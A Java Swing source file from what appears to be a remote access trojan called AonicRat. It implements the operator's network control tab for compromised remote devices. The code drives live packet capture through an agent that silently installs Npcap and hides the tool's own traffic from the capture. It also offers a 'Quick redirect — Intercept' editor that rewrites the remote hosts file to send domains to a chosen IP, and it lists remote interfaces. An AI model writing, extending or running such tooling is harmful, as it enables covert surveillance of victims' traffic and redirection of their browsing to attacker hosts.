package com.webaon.aonicrat;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableRowSorter;
import java.awt.*;
import java.awt.event.*;
import java.util.*;
import java.util.List;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Network Controls tab — same device-selector pattern as CLI and File System.
 *
 * Three sub-tabs:
 *  1. Packets   — live packet capture via tcpdump / tshark subprocess.
 *                 All traffic to/from the AonicRat server is auto-filtered out.
 *  2. Hosts     — read/edit the remote hosts file for domain redirection.
 *  3. Interfaces — list all remote network interfaces (pure Java, always works).
 */
public class NetworkControlPanel extends JPanel {

    // ── device selector (top bar) ─────────────────────────────────────────────
    private final JComboBox<String> osCombo = new JComboBox<>(
            new String[]{"Windows", "Mac OS", "Linux", "Android", "iOS"});
    private final JComboBox<String> deviceCombo  = new JComboBox<>();
    private final JButton loadBtn       = new JButton("Load More Devices");
    private final JButton connectBtn    = new JButton("Connect");
    private final JButton disconnectBtn = new JButton("Disconnect");
    private final JLabel  statusLabel   = new JLabel("  Not connected");

    // ── packet capture ────────────────────────────────────────────────────────
    private final DefaultTableModel packetModel = new DefaultTableModel(
            new String[]{"No.", "Time", "Source", "Src Port",
                         "Destination", "Dst Port", "Protocol", "Len", "Info"}, 0) {
        @Override public boolean isCellEditable(int r, int c) { return false; }
    };
    private final JTable    packetTable = new JTable(packetModel);
    private final JTextField pktFilter  = new JTextField(18);
    private final JComboBox<String> protoFilter = new JComboBox<>(
            new String[]{"All","TCP","UDP","ICMP","ARP","DNS","HTTP","HTTPS","SSH"});
    private final JButton startBtn  = new JButton("▶ Start");
    private final JButton stopBtn   = new JButton("■ Stop");
    private final JButton clearBtn  = new JButton("Clear");
    private final JLabel  capStatus = new JLabel("  Idle");

    // incoming packets are buffered; a Swing Timer flushes them to the table at 10 Hz
    private final LinkedBlockingQueue<String[]> packetQueue = new LinkedBlockingQueue<>(5000);
    private final AtomicLong packetSeq = new AtomicLong(0);
    private static final int MAX_ROWS = 10_000;

    // ── hosts editor ──────────────────────────────────────────────────────────
    private final DefaultTableModel hostsModel = new DefaultTableModel(
            new String[]{"IP Address", "Hostname", "Comment"}, 0);
    private final JTable  hostsTable   = new JTable(hostsModel);
    private final JButton addHostBtn   = new JButton("Add");
    private final JButton deleteHostBtn= new JButton("Delete");
    private final JButton saveHostsBtn = new JButton("Save to Remote");
    private final JButton loadHostsBtn = new JButton("Reload");
    private String[] hostsHeader       = {};   // preserved comment lines

    // ── interfaces ────────────────────────────────────────────────────────────
    private final DefaultTableModel ifModel = new DefaultTableModel(
            new String[]{"Interface","IPv4","IPv6","MAC","MTU","Status"}, 0) {
        @Override public boolean isCellEditable(int r, int c) { return false; }
    };
    private final JTable  ifTable      = new JTable(ifModel);
    private final JButton refreshIfBtn = new JButton("Refresh");

    // ── state ─────────────────────────────────────────────────────────────────
    private final ServerManager serverManager;
    private RemoteDevice currentDevice;
    private String capSessionId;

    // ─────────────────────────────────────────────────────────────────────────
    public NetworkControlPanel(ServerManager sm) {
        this.serverManager = sm;
        setLayout(new BorderLayout(0, 0));
        add(buildTopBar(),    BorderLayout.NORTH);
        add(buildCenterTabs(),BorderLayout.CENTER);
        add(buildStatusBar(), BorderLayout.SOUTH);
        setupNetCapListener();
        setupFlushTimer();
        wireButtons();
    }

    // ── Top device-selector bar ───────────────────────────────────────────────
    private JPanel buildTopBar() {
        JPanel bar = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 5));
        bar.setBackground(new Color(102, 204, 255));
        bar.add(new JLabel("OS Type:")); bar.add(osCombo);
        bar.add(new JLabel("Device:"));  bar.add(deviceCombo);
        deviceCombo.setPreferredSize(new Dimension(220, 22));
        bar.add(loadBtn); bar.add(connectBtn); bar.add(disconnectBtn);
        return bar;
    }

    // ── Status bar ────────────────────────────────────────────────────────────
    private JPanel buildStatusBar() {
        JPanel bar = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 3));
        bar.setBackground(new Color(230, 230, 230));
        bar.add(new JLabel("Status:"));
        bar.add(statusLabel);
        return bar;
    }

    // ── Centre tabs ───────────────────────────────────────────────────────────
    private JTabbedPane buildCenterTabs() {
        JTabbedPane tabs = new JTabbedPane();
        tabs.addTab("Packets",    buildPacketsTab());
        tabs.addTab("Hosts Editor", buildHostsTab());
        tabs.addTab("Interfaces", buildInterfacesTab());
        return tabs;
    }

    // ── Packets tab ───────────────────────────────────────────────────────────
    private JPanel buildPacketsTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 4));
        panel.setBorder(BorderFactory.createEmptyBorder(4, 4, 4, 4));

        // toolbar
        JPanel toolbar = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        toolbar.add(new JLabel("Filter (BPF):"));
        toolbar.add(pktFilter);
        toolbar.add(new JLabel("Protocol:"));
        toolbar.add(protoFilter);
        toolbar.add(startBtn);
        toolbar.add(stopBtn);
        toolbar.add(clearBtn);
        toolbar.add(capStatus);
        stopBtn.setEnabled(false);
        panel.add(toolbar, BorderLayout.NORTH);

        // table
        packetTable.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
        int[] widths = {50, 110, 130, 65, 130, 65, 70, 50, 400};
        for (int i = 0; i < widths.length; i++)
            packetTable.getColumnModel().getColumn(i).setPreferredWidth(widths[i]);
        packetTable.setFont(new Font("Consolas", Font.PLAIN, 12));
        packetTable.getTableHeader().setReorderingAllowed(false);

        // row sorter for the Protocol filter
        TableRowSorter<DefaultTableModel> sorter = new TableRowSorter<>(packetModel);
        packetTable.setRowSorter(sorter);
        protoFilter.addActionListener(e -> applyProtoFilter(sorter));

        panel.add(new JScrollPane(packetTable), BorderLayout.CENTER);

        // info note
        JLabel note = new JLabel(
            "<html><small>Uses <b>Pcap4J</b> — auto-installs Npcap on Windows (silent, ~60 s) "
          + "and libpcap on Linux. Requires <b>admin / root</b> on the remote device. "
          + "If capture hangs on first use, restart the agent after Npcap installs.</small></html>");
        note.setBorder(BorderFactory.createEmptyBorder(2, 4, 2, 4));
        panel.add(note, BorderLayout.SOUTH);
        return panel;
    }

    private void applyProtoFilter(TableRowSorter<DefaultTableModel> sorter) {
        String proto = (String) protoFilter.getSelectedItem();
        if (proto == null || proto.equals("All")) {
            sorter.setRowFilter(null);
        } else {
            final String p = proto;
            sorter.setRowFilter(RowFilter.regexFilter("(?i)" + p, 6)); // column 6 = Protocol
        }
    }

    // ── Hosts Editor tab ──────────────────────────────────────────────────────
    private JPanel buildHostsTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 4));
        panel.setBorder(BorderFactory.createEmptyBorder(4, 4, 4, 4));

        // toolbar
        JPanel toolbar = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        toolbar.add(loadHostsBtn);
        toolbar.add(addHostBtn);
        toolbar.add(deleteHostBtn);
        toolbar.add(saveHostsBtn);

        JLabel quickLabel = new JLabel("  Quick redirect — Intercept: ");
        JTextField quickHost = new JTextField("example.com", 16);
        JTextField quickIp   = new JTextField("127.0.0.1", 10);
        JButton quickAdd     = new JButton("Add Redirect");
        toolbar.add(quickLabel);
        toolbar.add(quickHost);
        toolbar.add(new JLabel(" → to IP: "));
        toolbar.add(quickIp);
        toolbar.add(quickAdd);
        panel.add(toolbar, BorderLayout.NORTH);

        hostsTable.setFont(new Font("Consolas", Font.PLAIN, 12));
        hostsTable.setRowHeight(20);
        hostsTable.getColumnModel().getColumn(0).setPreferredWidth(140);
        hostsTable.getColumnModel().getColumn(1).setPreferredWidth(250);
        hostsTable.getColumnModel().getColumn(2).setPreferredWidth(300);
        panel.add(new JScrollPane(hostsTable), BorderLayout.CENTER);

        JLabel note = new JLabel(
            "<html><small>"
          + "Hosts file maps <b>hostnames → IP addresses</b> at OS level (not domain→domain). "
          + "A web server must be running at the target IP to serve content. "
          + "After saving, flush DNS: <b>ipconfig /flushdns</b> (Windows) · "
          + "<b>systemd-resolve --flush-caches</b> (Linux). "
          + "HTTPS sites will still show cert warnings. "
          + "Requires <b>admin</b> (Windows) or <b>root</b> (Linux/macOS) on the remote device."
          + "</small></html>");
        note.setBorder(BorderFactory.createEmptyBorder(2, 4, 2, 4));
        panel.add(note, BorderLayout.SOUTH);

        // quick add button
        quickAdd.addActionListener(e -> {
            String ip   = quickIp.getText().trim();
            String host = quickHost.getText().trim();
            if (ip.isEmpty() || host.isEmpty()) return;
            if (!ip.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) {
                JOptionPane.showMessageDialog(NetworkControlPanel.this,
                    "\"to IP\" must be a numeric IP address (e.g. 127.0.0.1), not a domain name.",
                    "Invalid IP", JOptionPane.WARNING_MESSAGE);
                return;
            }
            hostsModel.addRow(new Object[]{ip, host, ""});
        });
        return panel;
    }

    // ── Interfaces tab ────────────────────────────────────────────────────────
    private JPanel buildInterfacesTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 4));
        panel.setBorder(BorderFactory.createEmptyBorder(4, 4, 4, 4));

        JPanel toolbar = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        toolbar.add(refreshIfBtn);
        panel.add(toolbar, BorderLayout.NORTH);

        ifTable.setFont(new Font("Consolas", Font.PLAIN, 12));
        ifTable.setRowHeight(20);
        ifTable.getColumnModel().getColumn(0).setPreferredWidth(130);
        ifTable.getColumnModel().getColumn(1).setPreferredWidth(130);
        ifTable.getColumnModel().getColumn(2).setPreferredWidth(200);
        ifTable.getColumnModel().getColumn(3).setPreferredWidth(140);
        ifTable.getColumnModel().getColumn(4).setPreferredWidth(60);
        ifTable.getColumnModel().getColumn(5).setPreferredWidth(60);
        panel.add(new JScrollPane(ifTable), BorderLayout.CENTER);
        return panel;
    }

    // ── Flush timer: adds queued packets to the table at ~10 Hz ──────────────
    private void setupFlushTimer() {
        new javax.swing.Timer(100, e -> flushPackets()).start();
    }

    private void flushPackets() {
        if (packetQueue.isEmpty()) return;
        List<String[]> batch = new ArrayList<>();
        packetQueue.drainTo(batch, 200); // max 200 rows per flush
        for (String[] row : batch) {
            if (packetModel.getRowCount() >= MAX_ROWS) {
                packetModel.removeRow(0); // drop oldest
            }
            packetModel.addRow(row);
        }
        // auto-scroll to last row
        int last = packetTable.getRowCount() - 1;
        if (last >= 0) packetTable.scrollRectToVisible(
                packetTable.getCellRect(last, 0, true));
    }

    // ── ServerManager listener ────────────────────────────────────────────────
    private void setupNetCapListener() {
        serverManager.setNetCapListener(new ServerManager.NetCapListener() {

            @Override
            public void onCaptureStarted(RemoteDevice d, String sid) {
                capStatus.setText("  Capturing…");
                startBtn.setEnabled(false);
                stopBtn.setEnabled(true);
                statusLabel.setText("  Capturing on " + d.pcName);
            }

            @Override
            public void onPacket(RemoteDevice d, String time, String src, String srcPort,
                                 String dst, String dstPort, String proto, int len, String info) {
                long no = packetSeq.incrementAndGet();
                packetQueue.offer(new String[]{
                    String.valueOf(no), time, src, srcPort, dst, dstPort, proto,
                    String.valueOf(len), info
                });
            }

            @Override
            public void onCaptureEnded(RemoteDevice d, String sid) {
                capStatus.setText("  Stopped");
                startBtn.setEnabled(true);
                stopBtn.setEnabled(false);
                statusLabel.setText("  Connected to " + d.pcName);
            }

            @Override
            public void onHostsData(RemoteDevice d, String[] header, String[][] rows) {
                hostsHeader = header;
                hostsModel.setRowCount(0);
                for (String[] r : rows) hostsModel.addRow(r);
                statusLabel.setText("  Hosts loaded (" + rows.length + " entries)");
            }

            @Override
            public void onHostsSaved(RemoteDevice d, boolean ok, String err) {
                if (ok) {
                    statusLabel.setText("  Hosts file saved on " + d.pcName);
                    JOptionPane.showMessageDialog(NetworkControlPanel.this,
                        "Hosts file saved successfully.", "Success",
                        JOptionPane.INFORMATION_MESSAGE);
                } else {
                    JOptionPane.showMessageDialog(NetworkControlPanel.this,
                        "Save failed: " + err + "\nMake sure the agent runs as admin/root.",
                        "Error", JOptionPane.ERROR_MESSAGE);
                }
            }

            @Override
            public void onInterfacesData(RemoteDevice d, String[][] rows) {
                ifModel.setRowCount(0);
                for (String[] r : rows) ifModel.addRow(r);
                statusLabel.setText("  Interfaces loaded from " + d.pcName);
            }

            @Override
            public void onError(RemoteDevice d, String op, String err) {
                if ("status".equals(op)) {
                    // progress update from the agent (e.g. "Downloading Npcap…") — no dialog
                    capStatus.setText("  " + err);
                    statusLabel.setText("  " + err);
                    return;
                }
                capStatus.setText("  Error");
                startBtn.setEnabled(true);
                stopBtn.setEnabled(false);
                JOptionPane.showMessageDialog(NetworkControlPanel.this,
                    "[" + op + "] " + err, "Network Error", JOptionPane.ERROR_MESSAGE);
                statusLabel.setText("  Error: " + err);
            }
        });
    }

    // ── Button wiring ─────────────────────────────────────────────────────────
    private void wireButtons() {

        // ── device selector ──────────────────────────────────────────────────
        loadBtn.addActionListener(e -> {
            String os = (String) osCombo.getSelectedItem();
            List<RemoteDevice> devs = serverManager.getDevicesByOsType(os);
            DefaultComboBoxModel<String> m = new DefaultComboBoxModel<>();
            for (RemoteDevice d : devs) m.addElement(d.toString());
            deviceCombo.setModel(m);
        });

        connectBtn.addActionListener(e -> {
            String sel = (String) deviceCombo.getSelectedItem();
            if (sel == null || sel.isEmpty()) {
                JOptionPane.showMessageDialog(this, "Load devices first.");
                return;
            }
            currentDevice = serverManager.getConnectedDevices().stream()
                    .filter(d -> d.toString().equals(sel)).findFirst().orElse(null);
            if (currentDevice == null) {
                JOptionPane.showMessageDialog(this, "Device not found. Reload the list.");
                return;
            }
            statusLabel.setText("  Connected to " + currentDevice.pcName);
            // auto-load interfaces
            serverManager.sendNetCmd(currentDevice, "net:interfaces_list", null);
        });

        disconnectBtn.addActionListener(e -> {
            if (currentDevice != null && capSessionId != null) {
                serverManager.stopNetCapture(currentDevice, capSessionId);
                capSessionId = null;
            }
            currentDevice = null;
            packetQueue.clear();
            hostsModel.setRowCount(0);
            ifModel.setRowCount(0);
            statusLabel.setText("  Not connected");
            capStatus.setText("  Idle");
            startBtn.setEnabled(true);
            stopBtn.setEnabled(false);
        });

        // ── packet capture ───────────────────────────────────────────────────
        startBtn.addActionListener(e -> {
            if (currentDevice == null) {
                JOptionPane.showMessageDialog(this, "Connect to a device first.");
                return;
            }
            packetSeq.set(0);
            packetModel.setRowCount(0);
            String bpf = pktFilter.getText().trim();
            // Give immediate feedback before the agent responds
            capStatus.setText("  Connecting…");
            startBtn.setEnabled(false);
            stopBtn.setEnabled(true);
            statusLabel.setText("  Starting capture on " + currentDevice.pcName + "…");
            capSessionId = serverManager.startNetCapture(currentDevice, bpf);
        });

        stopBtn.addActionListener(e -> {
            if (currentDevice != null && capSessionId != null) {
                serverManager.stopNetCapture(currentDevice, capSessionId);
                capSessionId = null;
            }
        });

        clearBtn.addActionListener(e -> {
            packetModel.setRowCount(0);
            packetSeq.set(0);
        });

        // ── hosts editor ─────────────────────────────────────────────────────
        loadHostsBtn.addActionListener(e -> {
            if (currentDevice == null) {
                JOptionPane.showMessageDialog(this, "Connect to a device first.");
                return;
            }
            serverManager.sendNetCmd(currentDevice, "net:hosts_read", null);
        });

        addHostBtn.addActionListener(e -> {
            String ip   = JOptionPane.showInputDialog(this, "IP Address:", "127.0.0.1");
            if (ip == null) return;
            String host = JOptionPane.showInputDialog(this, "Hostname:", "example.com");
            if (host == null) return;
            hostsModel.addRow(new Object[]{ip.trim(), host.trim(), ""});
        });

        deleteHostBtn.addActionListener(e -> {
            int row = hostsTable.getSelectedRow();
            if (row >= 0) hostsModel.removeRow(hostsTable.convertRowIndexToModel(row));
        });

        saveHostsBtn.addActionListener(e -> {
            if (currentDevice == null) {
                JOptionPane.showMessageDialog(this, "Connect to a device first.");
                return;
            }
            // Collect all table rows into a JSON array
            org.json.JSONArray entries = new org.json.JSONArray();
            for (int i = 0; i < hostsModel.getRowCount(); i++) {
                org.json.JSONObject row = new org.json.JSONObject();
                row.put("ip",      hostsModel.getValueAt(i, 0));
                row.put("host",    hostsModel.getValueAt(i, 1));
                row.put("comment", hostsModel.getValueAt(i, 2));
                entries.put(row);
            }
            org.json.JSONObject payload = new org.json.JSONObject();
            payload.put("entries", entries);
            // preserve header comments
            org.json.JSONArray hdr = new org.json.JSONArray();
            for (String h : hostsHeader) hdr.put(h);
            payload.put("headerComments", hdr);
            serverManager.sendNetCmd(currentDevice, "net:hosts_write", payload);
        });

        // ── interfaces ───────────────────────────────────────────────────────
        refreshIfBtn.addActionListener(e -> {
            if (currentDevice == null) {
                JOptionPane.showMessageDialog(this, "Connect to a device first.");
                return;
            }
            serverManager.sendNetCmd(currentDevice, "net:interfaces_list", null);
        });
    }
}
